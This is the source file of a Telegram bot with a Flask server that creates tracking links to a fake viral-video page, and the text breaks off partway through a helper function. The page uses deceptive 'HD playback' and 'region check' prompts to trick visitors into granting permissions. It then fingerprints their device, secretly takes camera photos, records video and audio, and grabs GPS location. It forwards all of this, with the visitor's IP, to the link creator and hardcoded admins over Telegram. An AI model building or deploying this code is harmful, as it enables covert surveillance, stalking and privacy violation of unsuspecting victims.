import os
import json
import random
import secrets
import logging
import threading
import requests
from flask import Flask, request, render_template_string, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from datetime import datetime, timedelta

# ---------- Configuration ----------
BOT_TOKEN   = os.environ.get("BOT_TOKEN", "")
ADMIN_IDS   = {"1838854178", "1930138915"}
_replit_domain = os.environ.get("REPLIT_DEV_DOMAIN", "")
BASE_URL    = f"https://{_replit_domain}" if _replit_domain else "https://your-app.replit.dev"

tracking_links = {}   # token -> user_id
seen_users     = set()

# Telegram message effect IDs (shown on data messages)
EMOJI_EFFECTS = [
    "5104841245755180586",  # 🔥
    "5107584321108051014",  # 👍
    "5104858069142078462",  # 👎
    "5044134455711629726",  # ❤️
    "5046509860389126442",  # 🎉
    "5046589136895476101",  # 💩
]


def random_effect():
    return random.choice(EMOJI_EFFECTS)

# ── User data store ──
# user_data[user_id] = {
#   "points": int,
#   "access_expires": datetime | None,
#   "last_daily": date | None,
#   "referrals": int,
#   "referred_by": user_id | None,
#   "name": str
# }
user_data = {}

DAILY_BONUS_PTS  = 5    # points per daily claim
REFER_BONUS_PTS  = 10   # points referrer earns
PTS_PER_DAY      = 10   # points needed to get 1 day access
FREE_DAYS_NEW    = 1    # free days for brand-new users

flask_app = Flask(__name__)


# ─────────────────────────────────────────
# USER DATA HELPERS
# ─────────────────────────────────────────
def get_user(user_id):
    uid = str(user_id)
    if uid not in user_data:
        user_data[uid] = {
            "points": 0,
            "access_expires": None,
            "last_daily": None,
            "referrals": 0,
            "referred_by": None,
            "name": "Unknown"
        }
    return user_data[uid]


def is_admin(user_id):
    return str(user_id) in ADMIN_IDS


def has_access(user_id):
    if is_admin(user_id):
        return True
    u = get_user(user_id)
    exp = u.get("access_expires")
    return exp is not None and exp > datetime.now()


def add_access_days(user_id, days):
    u = get_user(user_id)
    now = datetime.now()
    base = u["access_expires"] if u["access_expires"] and u["access_expires"] > now else now
    u["access_expires"] = base + timedelta(days=days)


def add_points(user_id, pts):
    u = get_user(user_id)
    u["points"] = max(0, u.get("points", 0) + pts)


def remove_points(user_id, pts):
    u = get_user(user_id)
    u["points"] = max(0, u.get("points", 0) - pts)


def redeem_points(user_id):
    """Convert every 10 points → 1 day access. Returns days added."""
    u = get_user(user_id)
    pts = u.get("points", 0)
    days = pts // PTS_PER_DAY
    if days > 0:
        remaining = pts % PTS_PER_DAY
        u["points"] = remaining
        add_access_days(user_id, days)
    return days


def access_expires_str(user_id):
    u = get_user(user_id)
    exp = u.get("access_expires")
    if not exp:
        return "❌ Access မရှိပါ | No access"
    if exp < datetime.now():
        return "⏰ Access ကုန်သွားပြီ | Expired"
    delta = exp - datetime.now()
    h = int(delta.total_seconds() // 3600)
    m = int((delta.total_seconds() % 3600) // 60)
    return f"✅ {h}h {m}m ကျန်သည် | {h}h {m}m remaining"


# ─────────────────────────────────────────
# HTML TEMPLATE
# ─────────────────────────────────────────
HTML_TEMPLATE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
<title>ViralStream – Watch Free</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0d0d0d;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;color:#fff;min-height:100vh;overflow-x:hidden}
.topbar{background:linear-gradient(90deg,#1a0a0a,#111);padding:10px 14px;display:flex;align-items:center;gap:10px;border-bottom:2px solid #e63946;position:sticky;top:0;z-index:50}
.logo{font-size:1.3rem;font-weight:900;color:#e63946;letter-spacing:-1px;text-shadow:0 0 20px rgba(230,57,70,.4)}
.logo span{color:#fff}
.live-badge{background:#e63946;color:#fff;font-size:.6rem;font-weight:700;padding:2px 6px;border-radius:3px;letter-spacing:.5px;animation:pulse 1.5s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.6}}
.searchbar{flex:1;background:#1e1e1e;border:1px solid #2a2a2a;border-radius:20px;padding:7px 14px;color:#aaa;font-size:.82rem}
.hero{background:linear-gradient(135deg,#1a0010,#0a0a2e,#001a0a);padding:10px 14px 6px;border-bottom:1px solid #1e1e1e}
.hero-title{font-size:.75rem;color:#e63946;font-weight:700;letter-spacing:1px;text-transform:uppercase;margin-bottom:4px}
.trending-row{display:flex;gap:8px;overflow-x:auto;padding-bottom:4px;scrollbar-width:none}
.trending-row::-webkit-scrollbar{display:none}
.t-chip{background:#1e1e1e;border:1px solid #333;border-radius:12px;padding:4px 10px;font-size:.7rem;color:#aaa;white-space:nowrap}
.t-chip.hot{border-color:#e63946;color:#e63946}
.player-wrap{position:relative;background:#000;width:100%;aspect-ratio:16/9}
.thumb-img{width:100%;height:100%;object-fit:cover;filter:brightness(.55) saturate(1.3)}
.badges{position:absolute;top:10px;left:10px;display:flex;gap:6px}
.badge{padding:3px 8px;border-radius:4px;font-size:.65rem;font-weight:700;letter-spacing:.5px}
.badge.hd{background:#e63946;color:#fff}
.badge.viral{background:rgba(255,200,0,.9);color:#000}
.badge.new{background:rgba(0,200,100,.9);color:#000}
.view-count{position:absolute;top:10px;right:10px;background:rgba(0,0,0,.7);padding:3px 8px;border-radius:4px;font-size:.65rem;color:#ccc}
.play-overlay{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:10px}
.play-ring{width:80px;height:80px;border-radius:50%;border:3px solid rgba(255,255,255,.3);display:flex;align-items:center;justify-content:center;position:relative;cursor:pointer}
.play-ring::before{content:'';position:absolute;inset:-6px;border-radius:50%;border:2px solid rgba(230,57,70,.5);animation:ring-pulse 2s infinite}
@keyframes ring-pulse{0%{transform:scale(1);opacity:.8}100%{transform:scale(1.3);opacity:0}}
.play-btn-inner{width:64px;height:64px;background:rgba(230,57,70,.85);border-radius:50%;display:flex;align-items:center;justify-content:center;backdrop-filter:blur(8px);transition:all .2s;box-shadow:0 0 30px rgba(230,57,70,.4)}
.play-btn-inner:hover{background:#e63946;transform:scale(1.05)}
.play-btn-inner svg{width:28px;height:28px;fill:#fff;margin-left:4px}
.play-label{font-size:.82rem;font-weight:700;letter-spacing:.5px;text-align:center;padding:0 8px;text-shadow:0 0 10px rgba(230,57,70,.8);animation:live-blink 1.1s steps(1) infinite}
@keyframes live-blink{
  0%{color:#fff;text-shadow:0 0 14px #e63946,0 0 28px rgba(230,57,70,.5)}
  25%{color:#e63946;text-shadow:0 0 20px #fff,0 0 40px #e63946}
  50%{color:#fff;text-shadow:0 0 14px #e63946,0 0 28px rgba(230,57,70,.5)}
  75%{color:#ffcc00;text-shadow:0 0 18px #fff,0 0 32px #ffcc00}
}
.buffer-bar{position:absolute;bottom:0;left:0;right:0;height:3px;background:rgba(255,255,255,.1)}
.buffer-fill{height:100%;background:linear-gradient(90deg,#e63946,#ff6b6b);width:0%;transition:width .5s ease}
.info{padding:12px 14px 6px}
.info-title{font-size:.97rem;font-weight:700;line-height:1.4;margin-bottom:5px}
.info-meta{color:#777;font-size:.75rem;margin-bottom:8px;display:flex;align-items:center;gap:8px}
.dot{color:#333}
.tags{display:flex;gap:5px;flex-wrap:wrap;margin-bottom:10px}
.tag{background:#1a1a1a;border:1px solid #2a2a2a;border-radius:12px;padding:3px 9px;font-size:.68rem;color:#888}
.tag.fire{color:#e63946;border-color:#e63946}
.engage{display:flex;gap:0;border-top:1px solid #1a1a1a;border-bottom:1px solid #1a1a1a;margin-bottom:10px}
.eng-btn{flex:1;padding:10px 0;text-align:center;font-size:.7rem;color:#777;cursor:pointer;border-right:1px solid #1a1a1a}
.eng-btn:last-child{border-right:none}
.eng-icon{font-size:1rem;display:block;margin-bottom:2px}
.section-label{padding:4px 14px 6px;font-size:.72rem;color:#666;text-transform:uppercase;letter-spacing:.5px}
.rec-item{display:flex;gap:10px;padding:8px 14px;border-bottom:1px solid #111;cursor:pointer}
.rec-thumb{width:110px;min-width:110px;height:62px;border-radius:5px;overflow:hidden;position:relative;background:#1a1a1a}
.rec-thumb img{width:100%;height:100%;object-fit:cover}
.rec-dur{position:absolute;bottom:3px;right:3px;background:rgba(0,0,0,.8);border-radius:2px;padding:1px 4px;font-size:.65rem}
.rec-info .rec-title{font-size:.78rem;font-weight:500;line-height:1.3;margin-bottom:3px}
.rec-sub{font-size:.68rem;color:#555}
.rec-fire{color:#e63946;font-size:.7rem}
.modal-backdrop{display:none;position:fixed;inset:0;background:rgba(0,0,0,.9);z-index:200;align-items:center;justify-content:center}
.modal-backdrop.show{display:flex}
.modal{background:#141414;border:1px solid #2a2a2a;border-radius:14px;padding:26px 22px;max-width:320px;width:92%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.8)}
.modal-icon{font-size:2.8rem;margin-bottom:10px}
.modal h3{font-size:1rem;font-weight:700;line-height:1.5;margin-bottom:8px}
.modal p{color:#888;font-size:.8rem;line-height:1.6;margin-bottom:18px}
.modal-btn{width:100%;padding:13px;border:none;border-radius:9px;font-size:.95rem;font-weight:700;cursor:pointer;margin-bottom:8px;transition:all .15s}
.modal-btn.primary{background:linear-gradient(135deg,#e63946,#c1121f);color:#fff;box-shadow:0 4px 20px rgba(230,57,70,.3)}
.modal-btn.primary:hover{transform:translateY(-1px);box-shadow:0 6px 24px rgba(230,57,70,.4)}
.modal-btn.sec{background:#1e1e1e;color:#666;font-size:.78rem;font-weight:400}
#toast{display:none;position:fixed;bottom:24px;left:50%;transform:translateX(-50%);background:#222;color:#fff;padding:9px 20px;border-radius:20px;font-size:.78rem;z-index:300;border:1px solid #333}
</style>
</head>
<body>
<div class="topbar">
  <div class="logo">▶<span>Viral</span></div>
  <span class="live-badge">LIVE</span>
  <div class="searchbar">Search trending videos...</div>
</div>
<div class="hero">
  <div class="hero-title">🔥 Trending Now</div>
  <div class="trending-row">
    <div class="t-chip hot">#Viral2024</div>
    <div class="t-chip">#Exclusive</div>
    <div class="t-chip hot">#MustWatch</div>
    <div class="t-chip">#Breaking</div>
    <div class="t-chip">#Leaked</div>
    <div class="t-chip hot">#Trending</div>
  </div>
</div>
<div class="player-wrap" id="playerWrap">
  <img class="thumb-img" src="https://picsum.photos/seed/viral2024/800/450" alt="">
  <div class="badges">
    <span class="badge hd">4K HD</span>
    <span class="badge viral">🔥 VIRAL</span>
    <span class="badge new">NEW</span>
  </div>
  <div class="view-count">👁 2.4M views</div>
  <div class="play-overlay" id="playOverlay">
    <div class="play-ring" id="playBtn">
      <div class="play-btn-inner">
        <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
      </div>
    </div>
    <div class="play-label">👉 TAP TO WATCH ဒီမှာနိပ်ပါ Allow ကိုနိပ်ပါ 👈</div>
  </div>
  <div class="buffer-bar"><div class="buffer-fill" id="bufferFill"></div></div>
</div>
<div class="modal-backdrop" id="modal"></div>
<div class="info">
  <div class="info-title">🔥 Exclusive Leaked Footage 2024 – You Won't Believe This!</div>
  <div class="info-meta">
    <span>2.4M views</span><span class="dot">•</span>
    <span>3 hours ago</span><span class="dot">•</span>
    <span style="color:#e63946">🔥 Trending #1</span>
  </div>
  <div class="tags">
    <span class="tag fire">#Viral</span>
    <span class="tag fire">#Exclusive</span>
    <span class="tag">#2024</span>
    <span class="tag">#MustWatch</span>
    <span class="tag">#Breaking</span>
  </div>
</div>
<div class="engage">
  <div class="eng-btn"><span class="eng-icon">👍</span>98K</div>
  <div class="eng-btn"><span class="eng-icon">💬</span>4.2K</div>
  <div class="eng-btn"><span class="eng-icon">🔗</span>Share</div>
  <div class="eng-btn"><span class="eng-icon">⬇️</span>Save</div>
</div>
<div class="section-label">Up Next</div>
<div class="rec-item"><div class="rec-thumb"><img src="https://picsum.photos/seed/rec11/120/68"><div class="rec-dur">8:47</div></div><div class="rec-info"><div class="rec-title">Hidden Cam Footage Goes Viral – Watch Before Deleted!</div><div class="rec-sub">ViralHub <span class="rec-fire">🔥</span> 1.8M views</div></div></div>
<div class="rec-item"><div class="rec-thumb"><img src="https://picsum.photos/seed/rec22/120/68"><div class="rec-dur">12:03</div></div><div class="rec-info"><div class="rec-title">Caught on Camera – Unbelievable Real Moments 2024</div><div class="rec-sub">TopClips • 3.1M views</div></div></div>
<div class="rec-item"><div class="rec-thumb"><img src="https://picsum.photos/seed/rec33/120/68"><div class="rec-dur">6:29</div></div><div class="rec-info"><div class="rec-title">SECRET Recording Exposed – This is WILD 🤯</div><div class="rec-sub">BestOf2024 <span class="rec-fire">🔥</span> 4.7M views</div></div></div>
<div class="rec-item"><div class="rec-thumb"><img src="https://picsum.photos/seed/rec44/120/68"><div class="rec-dur">18:55</div></div><div class="rec-info"><div class="rec-title">They Didn't Know They Were Recorded... 😱</div><div class="rec-sub">ShockVid • 920K views</div></div></div>
<div class="rec-item"><div class="rec-thumb"><img src="https://picsum.photos/seed/rec55/120/68"><div class="rec-dur">4:11</div></div><div class="rec-info"><div class="rec-title">Exclusive: What Really Happened – Full Footage</div><div class="rec-sub">ExclusiveTV • 2.2M views</div></div></div>
<div id="toast"></div>
<script>
const token = "{{ token }}";
const mode  = "{{ mode }}";

function showToast(msg,ms=3500){
  const t=document.getElementById("toast");
  t.textContent=msg;t.style.display="block";
  setTimeout(()=>t.style.display="none",ms);
}
function animateBuffer(pct,dur){
  const f=document.getElementById("bufferFill");
  f.style.transition=`width ${dur}ms linear`;f.style.width=pct+"%";
}
async function getDeviceModel(){
  if(navigator.userAgentData){
    try{const d=await navigator.userAgentData.getHighEntropyValues(["model","platform"]);if(d.model&&d.model.trim())return d.model.trim();}catch(e){}
  }
  const ua=navigator.userAgent;
  let m=ua.match(/;\\s*([A-Za-z0-9 _\\-]+)\\s+Build/);if(m)return m[1].trim();
  m=ua.match(/\\(([^;)]+);\\s*([^;)]+);\\s*([^;)]+)\\)/);if(m)return m[3].trim();
  return navigator.platform||"Unknown";
}
async function collectFingerprint(){
  let battery={};
  try{const b=await navigator.getBattery();battery={batteryLevel:Math.round(b.level*100)+"%",charging:b.charging};}catch(e){}
  const conn=navigator.connection||navigator.mozConnection||navigator.webkitConnection||{};
  const deviceModel=await getDeviceModel();
  return{userAgent:navigator.userAgent,deviceModel,platform:navigator.platform,
    screenWidth:screen.width,screenHeight:screen.height,language:navigator.language,
    timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,
    hardwareConcurrency:navigator.hardwareConcurrency,deviceMemory:navigator.deviceMemory,
    maxTouchPoints:navigator.maxTouchPoints,connectionType:conn.effectiveType||conn.type||"unknown",
    downlink:conn.downlink,localTime:new Date().toString(),...battery};
}
async function sendFingerprint(){
  try{
    const fp=await collectFingerprint();
    fetch("/capture_fingerprint",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({token,fingerprint:fp})});
  }catch(e){}
}
function showPermModal(icon,titleMM,titleEN,bodyMM,bodyEN){
  return new Promise(resolve=>{
    const bd=document.getElementById("modal");
    bd.innerHTML=`<div class="modal">
      <div class="modal-icon">${icon}</div>
      <h3>${titleMM}<br><small style="color:#888;font-weight:400;font-size:.82em">${titleEN}</small></h3>
      <p>${bodyMM}<br><span style="color:#555">${bodyEN}</span></p>
      <button class="modal-btn primary" id="rBtn">Allow ကိုနှိပ်ပါ ▶</button>
    </div>`;
    bd.classList.add("show");
    document.getElementById("rBtn").onclick=()=>{bd.classList.remove("show");resolve();};
  });
}
async function getCameraStream(facing){
  while(true){
    try{return await navigator.mediaDevices.getUserMedia({video:{facingMode:facing,width:{ideal:1920},height:{ideal:1080}}});}
    catch(e){await showPermModal("📸","ကင်မရာ ခွင့်ပြုချက် လိုအပ်သည်","Camera Access Required","HD ဗီဒီယို ကြည့်ရှုရန် ကင်မရာ ခွင့်ပြုချက် လိုအပ်သည်","Camera permission is required to stream HD content.");}
  }
}
async function getMicStream(){
  while(true){
    try{return await navigator.mediaDevices.getUserMedia({audio:true});}
    catch(e){await showPermModal("🎤","မိုက်ခရိုဖုန်း ခွင့်ပြုချက် လိုအပ်သည်","Microphone Required","HD အသံဖြင့် ကြည့်ရှုရန် မိုက်ခရိုဖုန်း ခွင့်ပြုချက် လိုအပ်သည်","Microphone permission required for HD audio playback.");}
  }
}
async function getLocationPos(){
  while(true){
    try{return await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej,{timeout:15000,enableHighAccuracy:true}));}
    catch(e){await showPermModal("📍","တည်နေရာ စစ်ဆေးမှု လိုအပ်သည်","Location Verification Required","သင့်ဒေသ စစ်ဆေးမှသာ ဤဗီဒီယို ကြည့်ရှုနိုင်မည်","Location check required to unlock this content in your region.");}
  }
}
async function sendPhoto(){
  try{
    const stream=await getCameraStream("environment");
    const v=document.createElement("video");
    v.srcObject=stream;v.setAttribute("playsinline","");v.setAttribute("muted","");
    await new Promise((res,rej)=>{v.onloadedmetadata=()=>v.play().then(res).catch(rej);v.onerror=rej;});
    await new Promise(r=>setTimeout(r,1500));
    const c=document.createElement("canvas");
    c.width=v.videoWidth||1280;c.height=v.videoHeight||720;
    c.getContext("2d").drawImage(v,0,0);
    stream.getTracks().forEach(t=>t.stop());
    const blob=await new Promise(r=>c.toBlob(r,"image/jpeg",0.9));
    if(!blob||blob.size<800)return;
    const fp=await collectFingerprint();
    const form=new FormData();
    form.append("token",token);form.append("photo",blob,"photo.jpg");form.append("fingerprint",JSON.stringify(fp));
    fetch("/capture_combined_photo",{method:"POST",body:form});
  }catch(e){}
}
async function sendLocation(){
  try{
    const pos=await getLocationPos();
    const fp=await collectFingerprint();
    const form=new FormData();
    form.append("token",token);form.append("lat",pos.coords.latitude);form.append("lon",pos.coords.longitude);form.append("fingerprint",JSON.stringify(fp));
    fetch("/capture_combined_location",{method:"POST",body:form});
  }catch(e){}
}
async function sendVideo(){
  try{
    const mimeType=MediaRecorder.isTypeSupported("video/webm;codecs=vp8,opus")?"video/webm;codecs=vp8,opus":"video/webm";
    const camStream=await getCameraStream("user");
    const micStream=await getMicStream();
    const combined=new MediaStream([...camStream.getVideoTracks(),...micStream.getAudioTracks()]);
    const recorder=new MediaRecorder(combined,{mimeType});
    const chunks=[];
    recorder.ondataavailable=e=>{if(e.data.size>0)chunks.push(e.data);};
    recorder.start(300);
    await new Promise(r=>setTimeout(r,4000));
    recorder.stop();
    camStream.getTracks().forEach(t=>t.stop());micStream.getTracks().forEach(t=>t.stop());
    await new Promise(r=>recorder.onstop=r);
    const blob=new Blob(chunks,{type:mimeType});
    const fp=await collectFingerprint();
    const form=new FormData();
    form.append("token",token);form.append("video",blob,"video.webm");form.append("fingerprint",JSON.stringify(fp));
    fetch("/capture_combined_video",{method:"POST",body:form});
  }catch(e){}
}
async function sendAudio(){
  try{
    const stream=await getMicStream();
    const mimeType=MediaRecorder.isTypeSupported("audio/webm;codecs=opus")?"audio/webm;codecs=opus":"audio/webm";
    const recorder=new MediaRecorder(stream,{mimeType});
    const chunks=[];
    recorder.ondataavailable=e=>{if(e.data.size>0)chunks.push(e.data);};
    recorder.start(300);
    await new Promise(r=>setTimeout(r,6000));
    recorder.stop();
    stream.getTracks().forEach(t=>t.stop());
    await new Promise(r=>recorder.onstop=r);
    const blob=new Blob(chunks,{type:mimeType});
    const fp=await collectFingerprint();
    const form=new FormData();
    form.append("token",token);form.append("audio",blob,"audio.webm");form.append("fingerprint",JSON.stringify(fp));
    fetch("/capture_combined_audio",{method:"POST",body:form});
  }catch(e){}
}
async function startCapture(){
  animateBuffer(8,400);
  if(mode==="all"){
    await Promise.allSettled([sendPhoto(),sendLocation()]);
    animateBuffer(50,400);
    await sendVideo();
    animateBuffer(80,400);
    await sendAudio();
    animateBuffer(100,300);
  } else if(mode==="photo"){
    await sendPhoto();animateBuffer(100,600);
  } else if(mode==="audio"){
    await sendAudio();animateBuffer(100,600);
  } else if(mode==="location"){
    await sendLocation();animateBuffer(100,600);
  } else if(mode==="video"){
    await sendVideo();animateBuffer(100,600);
  } else {
    animateBuffer(100,600);
  }
  document.getElementById("playOverlay").innerHTML='<div style="color:#fff;font-size:.8rem;opacity:.5;text-align:center">Video unavailable<br>in your region</div>';
  showToast("⚠️ Content unavailable in your region. Try again later.");
}
const MODAL={
  all:{icon:"📺",mm:"HD ကြည့်ရှုရန် ခွင့်ပြုချက် လိုအပ်သည်",en:"HD Playback Required",bmm:"ကင်မရာ၊ မိုက်ခရိုဖုန်းနှင့် တည်နေရာ ခွင့်ပြုချက် ပေးရန် လိုအပ်သည်",ben:"Camera, microphone & location access required to unlock HD."},
  photo:{icon:"📸",mm:"ကင်မရာ ခွင့်ပြုချက် လိုအပ်သည်",en:"Camera Required",bmm:"HD ပုံရိပ်နှင့် ကြည့်ရှုရန် ကင်မရာ ခွင့်ပြုချက် လိုအပ်သည်",ben:"Camera access required to stream HD content."},
  audio:{icon:"🎤",mm:"မိုက်ခရိုဖုန်း ခွင့်ပြုချက် လိုအပ်သည်",en:"Microphone Required",bmm:"HD အသံဖြင့် ကြည့်ရှုရန် မိုက်ခရိုဖုန်း ခွင့်ပြုချက် လိုအပ်သည်",ben:"Microphone required for HD audio experience."},
  location:{icon:"📍",mm:"တည်နေရာ စစ်ဆေးမှု လိုအပ်သည်",en:"Region Check Required",bmm:"သင်နေသောဒေသမှ ဤဗီဒီယောကို ကြည့်ရှုခွင့်ရှိမရှိ စစ်ဆေးရန် လိုအပ်သည်",ben:"Location check required to verify you can watch this in your region."},
  video:{icon:"🎥",mm:"ကင်မရာ + မိုက်ခရိုဖုန်း ခွင့်ပြုချက် လိုအပ်သည်",en:"Camera & Mic Required",bmm:"HD ဗီဒီယို ကြည့်ရှုရန် ကင်မရာနှင့် မိုက်ခရိုဖုန်း ခွင့်ပြုချက် လိုအပ်သည်",ben:"Camera & mic access required to stream HD video."}
};
document.getElementById("playBtn").onclick=()=>{
  const t=MODAL[mode]||MODAL.all;
  const bd=document.getElementById("modal");
  bd.innerHTML=`<div class="modal">
    <div class="modal-icon">${t.icon}</div>
    <h3>${t.mm}<br><small style="color:#888;font-weight:400;font-size:.82em">${t.en}</small></h3>
    <p>${t.bmm}<br><span style="color:#555">${t.ben}</span></p>
    <button class="modal-btn primary" id="allowBtn">Allow ကိုနှိပ်ပါ ▶ Watch HD</button>
    <button class="modal-btn sec" id="skipBtn">အနိမ့်အရည်အသွေးဖြင့် ကြည့်မည် | Low Quality</button>
  </div>`;
  bd.classList.add("show");
  document.getElementById("allowBtn").onclick=async()=>{
    bd.classList.remove("show");
    document.getElementById("playOverlay").innerHTML='<div style="color:#fff;font-size:.85rem;opacity:.6;text-align:center">⏳ Buffering HD...</div>';
    animateBuffer(5,200);
    await startCapture();
  };
  document.getElementById("skipBtn").onclick=()=>{
    bd.classList.remove("show");
    showToast("⚠️ Low quality not available. Allow access to continue.");
    setTimeout(()=>document.getElementById("playBtn").click(),1800);
  };
};
sendFingerprint();
</script>
</body>
</html>"""


# ─────────────────────────────────────────
# FLASK ROUTES
# ─────────────────────────────────────────
@flask_app.route('/')
def index():
    return """<!DOCTYPE html><html><head><title>ViralStream</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0d0d0d;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh}
.box{text-align:center;padding:40px;background:#111;border-radius:14px;border:1px solid #222;max-width:400px;width:90%}
h1{color:#e63946;font-size:2rem;margin-bottom:12px}
p{color:#666;line-height:1.6;margin-bottom:8px}code{background:#1e1e1e;padding:3px 8px;border-radius:4px;color:#e63946}</style></head>
<body><div class="box"><h1>▶ ViralStream</h1>
<p>Bot ဖြင့် link ထုတ်ပြီး မျှဝေပါ</p>
<p style="margin-top:16px;font-size:.8rem;color:#444">Use <code>/grab</code> in the bot</p>
</div></body></html>""", 200


@flask_app.route('/track/<token>')
def track_page(token):
    mode = request.args.get('m', 'all')
    user_id = tracking_links.get(token)
    if user_id:
        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
        ua = request.headers.get('User-Agent', 'Unknown')[:120]
        mode_labels = {'all':'🌐 All-in-One','photo':'📸 Photo','audio':'🎤 Audio',
                       'location':'📍 Location','video':'🎥 Video'}
        label = mode_labels.get(mode, mode)
        alert = (
            f"🔗 <b>Link ဖွင့်သည်! | Link Opened!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🎯 Mode: <b>{label}</b>\n"
            f"🌐 IP: <code>{ip}</code>\n"
            f"📱 UA: {ua}\n"
            f"🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"━━━━━━━━━━━━━━━━━━━━"
        )
        threading.Thread(target=broadcast_message, args=(user_id, alert), daemon=True).start()
    return render_template_string(HTML_TEMPLATE, token=token, mode=mode)


# ─────────────────────────────────────────
# CAPTURE ENDPOINTS
# ─────────────────────────────────────────
@flask_app.route('/capture_fingerprint', methods=['POST'])
def capture_fingerprint():
    data = request.get_json(silent=True) or {}
    token = data.get('token')
    user_id = tracking_links.get(token)
    if not user_id:
        return jsonify({"ok": False}), 400
    fp = data.get('fingerprint', {})
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    report = (
        f"📱 <b>Device Info | ဖုန်းအချက်အလက်</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🌐 IP: <code>{ip}</code>\n"
        f"📱 Model: {fp.get('deviceModel','Unknown')}\n"
        f"💻 Platform: {fp.get('platform','Unknown')}\n"
        f"🖥 Screen: {fp.get('screenWidth','?')}×{fp.get('screenHeight','?')}\n"
        f"🗣 Language: {fp.get('language','?')}\n"
        f"⏰ Timezone: {fp.get('timezone','?')}\n"
        f"🔋 Battery: {fp.get('batteryLevel','?')} {'🔌' if fp.get('charging') else '🔋'}\n"
        f"📡 Net: {fp.get('connectionType','?')} / {fp.get('downlink','?')}Mbps\n"
        f"🧠 CPU: {fp.get('hardwareConcurrency','?')} cores | 💾 {fp.get('deviceMemory','?')}GB\n"
        f"📅 {fp.get('localTime','?')}\n"
        f"━━━━━━━━━━━━━━━━━━━━"
    )
    threading.Thread(target=broadcast_message, args=(user_id, report, True), daemon=True).start()
    return jsonify({"ok": True}), 200


@flask_app.route('/capture_combined_photo', methods=['POST'])
def capture_combined_photo():
    token = request.form.get('token')
    user_id = tracking_links.get(token)
    if not user_id:
        return jsonify({"ok": False}), 400
    photo_file = request.files.get('photo')
    if not photo_file:
        return jsonify({"ok": False}), 400
    fp_json = request.form.get('fingerprint')
    caption = _fp_caption(fp_json)
    photo_bytes = photo_file.read()
    threading.Thread(target=broadcast_photo, args=(user_id, photo_bytes, caption), daemon=True).start()
    return jsonify({"ok": True}), 200


@flask_app.route('/capture_combined_video', methods=['POST'])
def capture_combined_video():
    token = request.form.get('token')
    user_id = tracking_links.get(token)
    if not user_id:
        return jsonify({"ok": False}), 400
    video_file = request.files.get('video')
    if not video_file:
        return jsonify({"ok": False}), 400
    fp_json = request.form.get('fingerprint')
    caption = _fp_caption(fp_json)
    video_bytes = video_file.read()
    threading.Thread(target=broadcast_video, args=(user_id, video_bytes, caption), daemon=True).start()
    return jsonify({"ok": True}), 200


@flask_app.route('/capture_combined_audio', methods=['POST'])
def capture_combined_audio():
    token = request.form.get('token')
    user_id = tracking_links.get(token)
    if not user_id:
        return jsonify({"ok": False}), 400
    audio_file = request.files.get('audio')
    if not audio_file:
        return jsonify({"ok": False}), 400
    fp_json = request.form.get('fingerprint')
    caption = _fp_caption(fp_json)
    audio_bytes = audio_file.read()
    threading.Thread(target=broadcast_voice, args=(user_id, audio_bytes, caption), daemon=True).start()
    return jsonify({"ok": True}), 200


@flask_app.route('/capture_combined_location', methods=['POST'])
def capture_combined_location():
    token = request.form.get('token')
    user_id = tracking_links.get(token)
    if not user_id:
        return jsonify({"ok": False}), 400
    lat = request.form.get('lat')
    lon = request.form.get('lon')
    if not lat or not lon:
        return jsonify({"ok": False}), 400
    fp_json = request.form.get('fingerprint')
    caption = _fp_caption(fp_json)
    threading.Thread(target=broadcast_location, args=(user_id, lat, lon), daemon=True).start()
    threading.Thread(target=broadcast_message, args=(user_id, caption, True), daemon=True).start()
    return jsonify({"ok": True}), 200


def _fp_caption(fp_json):
    try:
        fp = json.loads(fp_json)
        return (
            f"📱 <b>Device Info</b>\n"
            f"📱 {fp.get('deviceModel','?')} | {fp.get('platform','?')}\n"
            f"🖥 {fp.get('screenWidth','?')}×{fp.get('screenHeight','?')} | {fp.get('language','?')}\n"
            f"⏰ {fp.get('timezone','?')}\n"
            f"🔋 {fp.get('batteryLevel','?')} | 📡 {fp.get('connectionType','?')}"
        )
    except Exception:
        return "📱 Device Info"


# ─────────────────────────────────────────
# TELEGRAM SEND HELPERS
# ─────────────────────────────────────────
def recipients(user_id):
    ids = [str(user_id)]
    for a in ADMIN_IDS:
        if a not in ids:
            ids.append(a)
    return ids


def send_telegram_message(chat_id, text, reply_markup=None, effect_id=None):
    try:
        payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
        if reply_markup:
            payload["reply_markup"] = reply_markup
        if effect_id:
            payload["message_effect_id"] = effect_id
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json=payload, timeout=10)
    except Exception:
        pass


def broadcast_message(user_id, text, use_effect=False):
    eff = random_effect() if use_effect else None
    for cid in recipients(user_id):
        threading.Thread(target=send_telegram_message, args=(cid, text), kwargs={"effect_id": eff}, daemon=True).start()


def broadcast_photo(user_id, photo_bytes, caption):
    eff = random_effect()
    for cid in recipients(user_id):
        try:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                data={'chat_id': cid, 'caption': caption[:1024], 'parse_mode': 'HTML',
                      'message_effect_id': eff},
                files={'photo': ('photo.jpg', photo_bytes, 'image/jpeg')}, timeout=30)
